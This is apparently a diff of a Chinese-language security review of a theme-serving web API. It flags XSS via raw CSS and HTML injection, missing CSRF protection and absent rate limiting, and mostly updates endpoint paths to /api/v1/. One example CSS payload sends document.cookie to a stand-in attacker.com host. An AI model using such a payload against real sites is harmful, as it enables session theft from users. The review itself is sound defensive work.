@@ -2,17 +2,17 @@
 
 ### 1. 严重的安全与注入风险 (XSS & Injection)
 *   **默认端点缺乏安全清洗：** 
-    项目虽然提供了 `/api/today-safe` 安全代理端点，但其“快速开始”和官方推荐的集成代码（Vanilla JS、React、Vue 示例）依然引导用户直接请求 `/api/today.json`。由于社区主题（占约 30% 的天数）采用**“即发即现”**机制，攻击者可以提交包含恶意代码的投稿。
+    项目虽然提供了 `/api/today-safe` 安全代理端点，但其“快速开始”和官方推荐的集成代码（Vanilla JS、React、Vue 示例）依然引导用户直接请求 `/api/v1/today.json`。由于社区主题（占约 30% 的天数）采用**“即发即现”**机制，攻击者可以提交包含恶意代码的投稿。
 *   **CSS 注入与 HTML 注入漏洞：** 
-    在客户端集成方案中，`customCss` 被直接写入 `<style>` 标签，`extensions` 内的 HTML 被直接通过 `insertAdjacentHTML` 注入到 `<body>` 中。如果用户直接使用 `/api/today.json` 且当天轮换到了恶意社区主题，攻击者可以通过恶意 CSS（例如利用 `background-image: url('http://attacker.com/steal?cookie=' + document.cookie)` 窃取敏感信息）或通过 `extensions` 直接注入恶意脚本。
+    在客户端集成方案中，`customCss` 被直接写入 `<style>` 标签，`extensions` 内的 HTML 被直接通过 `insertAdjacentHTML` 注入到 `<body>` 中。如果用户直接使用 `/api/v1/today.json` 且当天轮换到了恶意社区主题，攻击者可以通过恶意 CSS（例如利用 `background-image: url('http://attacker.com/steal?cookie=' + document.cookie)` 窃取敏感信息）或通过 `extensions` 直接注入恶意脚本。
 *   **缺乏 CSRF 保护：** 
-    管理员登录及后续的审核操作依靠 Cookie（HttpOnly + SameSite Strict）。但在后台审核接口（如 `POST /api/admin/review.json`）中没有设计额外的 CSRF Token 校验，仍存在跨站请求伪造的风险。
+    管理员登录及后续的审核操作依靠 Cookie（HttpOnly + SameSite Strict）。但在后台审核接口（如 `POST /api/v1/admin/review.json`）中没有设计额外的 CSRF Token 校验，仍存在跨站请求伪造的风险。
 
 ### 2. 滥用防护与限流设计缺失 (Abuse Vectors)
 *   **“即发即现”无审核队列：** 
-    社区投稿不经过审核便直接发布并计入 Redis。攻击者可利用脚本向 `POST /api/diy/submit.json` 批量发送垃圾、敏感或违法的主题信息。这不仅会污染整个社区商店，还会迅速撑爆 Redis 存储空间。
+    社区投稿不经过审核便直接发布并计入 Redis。攻击者可利用脚本向 `POST /api/v1/diy/submit.json` 批量发送垃圾、敏感或违法的主题信息。这不仅会污染整个社区商店，还会迅速撑爆 Redis 存储空间。
 *   **未设计速率限制（Rate Limiting）：** 
-    文档指出“目前无速率限制”。攻击者可轻松对 `/api/diy/submit.json` 或 `/api/diy/like.json` 发起 DDoS 攻击。
+    文档指出“目前无速率限制”。攻击者可轻松对 `/api/v1/diy/submit.json` 或 `/api/v1/diy/like.json` 发起 DDoS 攻击。
 *   **防刷赞机制可被轻易绕过：** 
     点赞去重依赖 `IP + User-Agent 头部 + 客户端生成并存储在 localStorage 的 UUID`。在攻击场景下，UUID 极其容易通过脚本生成并伪造，User-Agent 也可以任意修改，配合代理 IP 即可完全失效，使排行榜失去公信力。
 *   **缺少人机验证：** 
@@ -22,7 +22,7 @@
 *   **双重主题系统并行（技术债）：** 
     系统内同时存在 `OmniConfig`（来自独立的 OMNI-MATRIX 项目）和 `ComposedTheme`（基于 `ThemePart` 系统，包含 colors, typography 等 5 个可插拔部件系统）。这种设计导致了一套代码内包含两套并行的主题配置和解析逻辑。任何关于 CSS 变量定义的修改、添加或废弃，都需要在两套系统内手动同步，极易引入数据格式不一致的 Bug。
 *   **废弃/存留代码混杂：** 
-    项目结构中同时保留了旧版的 Vercel Edge 独立端点 `src/pages/api/today.ts` 和基于 Astro SSR 的端点 `src/pages/api/today.json.ts`。冗余的废弃端点未完全清理，给后续维护人员带来代码调用链路上的混淆。
+    项目已全面迁移至 `src/pages/api/v1/` 版本化 API 结构，旧的 Vercel Edge 独立端点 `src/pages/api/today.ts` 已彻底移除。`vercel.json` 和 `netlify.toml` 中保留了 `/api/today` → `/api/v1/today.json` 的 301 重定向以兼容旧版引用。
 
 ### 4. 客户端接入的性能与体验问题 (Client-Side Issues)
 *   **不可避免的样式闪烁 (FOUC)：** 
